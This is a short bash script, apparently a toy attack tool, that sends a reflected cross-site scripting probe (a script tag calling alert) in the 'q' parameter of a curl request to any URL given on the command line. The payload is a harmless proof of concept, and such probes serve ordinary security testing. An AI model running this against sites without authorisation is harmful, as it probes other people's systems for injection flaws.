#!/bin/bash

# xss.sh - Cross-Site Scripting (XSS) script

# Function to perform XSS attack
perform_xss() {
    echo "Starting XSS attack on $1..."
    curl -G "$1" --data-urlencode "q=<script>alert('XSS');</script>"
}

# Check if URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

URL=$1

perform_xss "$URL"
